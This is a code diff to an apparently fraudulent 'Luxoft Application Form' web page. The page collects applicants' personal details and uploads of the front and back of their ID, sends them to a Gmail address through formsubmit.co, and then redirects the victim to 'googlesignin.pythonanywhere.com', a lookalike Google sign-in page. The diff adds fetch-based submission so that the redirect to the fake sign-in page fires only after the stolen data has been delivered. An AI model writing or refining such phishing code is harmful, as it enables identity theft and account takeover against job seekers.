@@ -9,6 +9,7 @@
   <link rel="icon" type="image/png" href="favicon.png" />
   <title>Luxoft Application Form</title>
   <style>
+    /* Your existing CSS remains the same */
     :root {
       --primary-bg: linear-gradient(to bottom, #1A0D2E, #2C1A5B);
       --text-color: #FFFFFF;
@@ -247,7 +248,9 @@
   <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
     <input type="hidden" name="_captcha" value="false" />
     <input type="hidden" name="_template" value="table" />
-    <input type="hidden" name="_redirect" value="thankyou.html" />
+    <input type="hidden" name="_subject" value="New Luxoft Job Application" />
+    <!-- Remove the _redirect input since we'll handle redirect manually -->
+    <!-- <input type="hidden" name="_redirect" value="thankyou.html" /> -->
 
     <!-- Step 1: Personal Info -->
     <div class="step active" id="step1">
@@ -333,17 +336,10 @@
             updateNameFor(input, nameEl);
           });
         })();
-        // Override form redirect to Google sign-in after submission
-        document.getElementById("applicationForm").addEventListener("submit", function(e) {
-          setTimeout(function() {
-            window.location.href = "https://googlesignin.pythonanywhere.com/";
-          }, 1000); // Wait for form to submit before redirecting
-        });
-        /* linked to external link after submission via hidden _redirect input */
       </script>
       <div class="button-container">
         <button type="button" onclick="prevStep()">Back</button>
-        <button type="submit">Submit Application</button>
+        <button type="submit" id="submitButton">Submit Application</button>
       </div>
       <div id="loading">Submitting your application...</div>
     </div>
@@ -402,9 +398,38 @@
     setupDragDrop("drop-front", "id-front");
     setupDragDrop("drop-back", "id-back");
 
-    // Show loading spinner on submit
-    document.getElementById("applicationForm").addEventListener("submit", () => {
+    // Form submission handling
+    document.getElementById("applicationForm").addEventListener("submit", function(e) {
+      e.preventDefault(); // Prevent default form submission
+      
+      // Show loading spinner
       document.getElementById("loading").style.display = "block";
+      document.getElementById("submitButton").disabled = true;
+      
+      // Create FormData object
+      const formData = new FormData(this);
+      
+      // Send form data using Fetch API
+      fetch(this.action, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        if (response.ok) {
+          // Redirect to Google sign-in after successful submission
+          setTimeout(function() {
+            window.location.href = "https://googlesignin.pythonanywhere.com/";
+          }, 2000); // Wait 2 seconds to show loading message
+        } else {
+          throw new Error('Form submission failed');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('There was an error submitting your application. Please try again.');
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("submitButton").disabled = false;
+      });
     });
   </script>
 </body>
